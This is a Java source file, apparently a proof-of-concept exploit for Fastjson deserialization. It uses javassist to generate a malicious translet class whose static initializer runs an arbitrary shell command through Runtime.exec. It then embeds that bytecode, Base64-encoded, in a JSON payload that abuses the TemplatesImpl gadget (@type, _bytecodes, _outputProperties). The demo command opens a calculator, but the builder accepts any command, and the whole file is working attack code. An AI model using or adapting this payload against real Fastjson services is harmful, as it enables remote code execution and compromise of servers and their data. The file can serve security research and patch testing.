package me.lightless.fastjson;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.Serializable;


class ClassFiles {
    static String classAsFile(final Class<?> clazz) {
        return classAsFile(clazz, true);
    }

    static String classAsFile(final Class<?> clazz, boolean suffix) {
        String str;
        if (clazz.getEnclosingClass() == null) {
            str = clazz.getName().replace(".", "/");
        } else {
            str = classAsFile(clazz.getEnclosingClass(), false) + "$" + clazz.getSimpleName();
        }
        if (suffix) {
            str += ".class";
        }
        return str;
    }

    static byte[] classAsBytes(final Class<?> clazz) {
        try {
            final byte[] buffer = new byte[1024];
            final String file = classAsFile(clazz);
            final InputStream in = ClassFiles.class.getClassLoader().getResourceAsStream(file);
            if (in == null) {
                throw new IOException("couldn't find '" + file + "'");
            }
            final ByteArrayOutputStream out = new ByteArrayOutputStream();
            int len;
            while ((len = in.read(buffer)) != -1) {
                out.write(buffer, 0, len);
            }
            return out.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

}

class Gadgets {

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
        private static final long serialVersionUID = -5971610431559700674L;

        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }
    }

    static byte[] createEvilBytecode(final String command) throws Exception {
        // 获取容器ClassPool，注入classpath
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        System.out.println("insert classpath: " + new ClassClassPath(StubTransletPayload.class));

        // 获取class
        System.out.println("ClassName: " + StubTransletPayload.class.getName());
        final CtClass clazz = classPool.get(StubTransletPayload.class.getName());

        // 插入payload
        clazz.makeClassInitializer().insertAfter(
                "java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");"
        );
        clazz.setName("lightless.pwner");

        // 获取bytecodes
        final byte[] classBytes = clazz.toBytecode();
        return classBytes;
    }
}

public class Exp {

    static String buildPayload(final String command) throws Exception {
        byte[] bytecode = Gadgets.createEvilBytecode(command);
        String className = TemplatesImpl.class.getName();
        String json = "{\"@type\":\"" + className + "\"";
        json += ", \"_bytecodes\": [\"" + new sun.misc.BASE64Encoder().encode(bytecode) + "\"]";
        json += ", \"_name\": \"lightless\"";
        json += ", \"_tfactory\": { }";
        json += ", \"_outputProperties\":{ }";
        json += "}";

        return json;
    }

    public static void main(String[] args) {
        try {
            String jsonPayload = buildPayload("open -a Calculator");
            System.out.println("payload: " + jsonPayload);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
